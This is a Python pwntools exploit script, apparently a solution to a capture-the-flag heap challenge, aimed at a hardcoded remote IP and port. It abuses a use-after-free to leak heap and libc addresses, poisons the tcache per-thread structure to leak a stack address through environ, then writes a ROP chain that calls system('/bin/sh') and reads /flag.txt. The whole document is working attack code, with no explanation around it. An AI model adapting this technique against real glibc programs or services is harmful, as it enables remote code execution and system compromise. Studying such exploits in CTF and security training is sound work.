#!/usr/bin/env python3
from pwn import *

PORT = 46359
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000019C0
            brva 0x00000000000015DB
            brva 0x0000000000001939
            brva 0x000000000000168C
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def create(idx, sz, dt):
    sla(b'> ', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def read(idx):
    sla(b'> ', b'2')
    sla(b'Index: ', str(idx).encode())

def edit(idx, dt):
    sla(b'> ', b'3')
    sla(b'Index: ', str(idx).encode())
    sa(b'Data: ', dt)

def delete(idx):
    sla(b'> ', b'4')
    sla(b'Index: ', str(idx).encode())

# Stage 1: Leak heap, libc

create(0, 0x500, b'A'*8)
create(1, 0x100, b'B'*8)

delete(1)
read(1)
p.recvuntil(b'Data: ')
heap_base = u64(p.recv(5).ljust(8, b'\x00')) << 12
log.info(f'heap_base: {hex(heap_base)}')

edit(1, p64(heap_base >> 12) + p64(0))
delete(1)
delete(0)
read(0)
p.recvuntil(b'Data: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
log.info(f'libc_base: {hex(libc.address)}')

# Stage 2: Tcache perthread struct attack

def fake_tcache(entry):
    buf = bytearray(0x100)
    buf[2 * tcache_idx: 2 * tcache_idx + 2] = p16(1)
    buf[0x80 + 8 * tcache_idx: 0x80 + 8 * tcache_idx + 8] = p64(entry)
    return bytes(buf)

tcache_struct = heap_base + 0x10
edit(1, p64((heap_base >> 12) ^ tcache_struct))

tcache_idx = (0x110 - 0x20) // 0x10

create(2, 0x100, b'C'*8)
environ_target = libc.sym.environ - 0x10
create(3, 0x100, fake_tcache(environ_target))
# GDB()
create(4, 0x100, b'D')
read(4)
p.recvuntil(b'Data: ')
leak = p.recvn(0x20)
stack_leak = u64(leak[0x10:0x18])
log.info(f'stack_leak: {hex(stack_leak)}')

target = stack_leak - 0x260 - 0x18
edit(3, fake_tcache(target))

pl = flat(
    b'A'*0x18,
    libc.address + 0x2a3e5 + 1,
    libc.address + 0x2a3e5,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
)
# GDB()
create(5, 0x100, pl)
p.sendline(b'cat /flag.txt')
p.interactive()